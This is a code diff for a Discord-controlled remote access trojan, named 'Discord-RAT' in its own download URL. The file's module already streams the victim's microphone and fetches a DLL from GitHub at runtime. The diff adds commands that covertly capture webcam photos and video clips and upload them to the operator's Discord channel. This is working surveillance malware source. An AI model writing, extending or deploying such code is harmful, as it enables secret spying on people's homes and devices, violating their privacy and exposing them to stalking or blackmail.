@@ -1,14 +1,18 @@
 """
-commands/audio.py - TTS, microphone streaming, and volume control.
+commands/audio.py - TTS, microphone streaming, volume control, and webcam/video tools.
 """
 
+import os
 import re
+import asyncio
+import platform
 import subprocess
+import requests
 
+import cv2
 import discord
 import pyttsx3
-import platform
-import requests
+import numpy as np
 import sounddevice as sd
 from discord.ext import commands
 from discord.ext.commands import MissingRequiredArgument
@@ -30,8 +34,6 @@ if IS_WINDOWS:
 # ── Opus loading ───────────────────────────────────────────────────────────
 def _load_opus():
     if IS_WINDOWS:
-        import os
-
         url = (
             "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"
         )
@@ -65,13 +67,12 @@ _load_opus()
 class MicrophonePCM(discord.AudioSource):
     """Streams microphone input via sounddevice as 48kHz/16-bit Mono PCM."""
 
-    # Defaulted channels to 1 for macOS compatibility
     def __init__(self, channels=1, rate=48000, chunk=960, device=None):
         self._chunk = chunk
         try:
             self._stream = sd.RawInputStream(
                 samplerate=rate,
-                channels=channels, # Now 1
+                channels=channels, 
                 dtype="int16",
                 blocksize=chunk,
                 device=device,
@@ -82,15 +83,8 @@ class MicrophonePCM(discord.AudioSource):
             raise e
 
     def read(self) -> bytes:
-        # Read the mono data
         data, _ = self._stream.read(self._chunk)
-        
-        # 'data' is the raw bytes. We need to duplicate it for 'Stereo' 
-        # so Discord doesn't get confused by the length of the data.
-        import numpy as np
         audio_data = np.frombuffer(data, dtype=np.int16)
-        
-        # Duplicate the mono channel to make it "Fake Stereo"
         stereo_data = np.repeat(audio_data, 2)
         return stereo_data.tobytes()
 
@@ -98,6 +92,7 @@ class MicrophonePCM(discord.AudioSource):
         if hasattr(self, '_stream'):
             self._stream.stop()
             self._stream.close()
+
 
 # ── macOS Volume Helpers (AppleScript) ─────────────────────────────────────
 def _mac_get_volume() -> int:
@@ -216,12 +211,12 @@ class AudioCommands(commands.Cog):
             get_mute = lambda: vol.GetMute()
             set_vol = lambda pct: vol.SetMasterVolumeLevelScalar(pct / 100.0, None)
             set_mute = lambda m: vol.SetMute(1 if m else 0, None)
-        elif platform.system() == "Darwin": # macOS check
+        elif platform.system() == "Darwin":
             get_vol = _mac_get_volume
             get_mute = _mac_is_muted
             set_vol = _mac_set_volume
             set_mute = _mac_set_mute
-        else: # Linux
+        else:
             get_vol = _linux_get_volume
             get_mute = _linux_is_muted
             set_vol = _linux_set_volume
@@ -261,6 +256,109 @@ class AudioCommands(commands.Cog):
         else:
             msg = await ctx.send("❌ **Error:** Invalid command.")
             await msg.delete(delay=10)
+
+    # ── Webcam & Video Capture ─────────────────────────────────────────────
+    @commands.command()
+    @commands.check(is_authorized)
+    async def webcam(self, ctx):
+        """Captures a single image from the webcam and uploads it."""
+        if not in_correct_channel(ctx):
+            await wrong_channel(ctx)
+            return
+
+        await ctx.send(f"`[{current_time()}] Snapping photo...`")
+        file_path = os.path.join(TEMP_DIR, "webcam_snap.png")
+
+        try:
+            # Execute in a separate thread to keep bot loops non-blocking
+            await asyncio.to_thread(self._capture_photo, file_path)
+            
+            if os.path.exists(file_path):
+                await ctx.send(
+                    f"`[{current_time()}] Photo captured successfully:`", 
+                    file=discord.File(file_path)
+                )
+                os.remove(file_path)
+            else:
+                await ctx.send(f"`[{current_time()}] Failed to save photo.`")
+        except Exception as e:
+            await log_message(ctx, f"❌ **Error capturing webcam:** {e}", duration=10)
+
+    @webcam.error
+    async def webcam_error(self, ctx, error):
+        await generic_command_error(ctx, error)
+
+    @commands.command()
+    @commands.check(is_authorized)
+    async def video_stream_start(self, ctx, duration: int = 5):
+        """Captures a video clip from the webcam and uploads it."""
+        if not in_correct_channel(ctx):
+            await wrong_channel(ctx)
+            return
+
+        if duration > 30:
+            await ctx.send("❌ **Error:** Please keep the video duration under 30 seconds.")
+            return
+
+        await ctx.send(f"`[{current_time()}] Recording {duration} seconds of video...`")
+        file_path = os.path.join(TEMP_DIR, "webcam_stream.mp4")
+
+        try:
+            # Execute video capture logic in a separate thread
+            await asyncio.to_thread(self._record_video, file_path, duration)
+            
+            if os.path.exists(file_path):
+                await ctx.send(
+                    f"`[{current_time()}] Video recording complete:`", 
+                    file=discord.File(file_path)
+                )
+                os.remove(file_path)
+            else:
+                await ctx.send(f"`[{current_time()}] Failed to record video.`")
+        except Exception as e:
+            await log_message(ctx, f"❌ **Error recording video:** {e}", duration=10)
+
+    @video_stream_start.error
+    async def video_stream_start_error(self, ctx, error):
+        await generic_command_error(ctx, error)
+
+    def _capture_photo(self, file_path: str):
+        """Worker function for capturing a single webcam frame."""
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            raise Exception("Could not open webcam device connection.")
+        
+        # Warm up sensor frame
+        cap.read()
+        ret, frame = cap.read()
+        if ret:
+            cv2.imwrite(file_path, frame)
+        cap.release()
+        if not ret:
+            raise Exception("Failed to grab a valid frame from webcam.")
+
+    def _record_video(self, file_path: str, duration: int):
+        """Worker function for recording sequential frames to an MP4 asset."""
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            raise Exception("Could not open webcam device connection.")
+        
+        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+        fps = 20.0
+        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+        
+        out = cv2.VideoWriter(file_path, fourcc, fps, (width, height))
+        frames_to_capture = int(fps * duration)
+        
+        for _ in range(frames_to_capture):
+            ret, frame = cap.read()
+            if not ret:
+                break
+            out.write(frame)
+            
+        cap.release()
+        out.release()
 
 
 async def setup(bot):
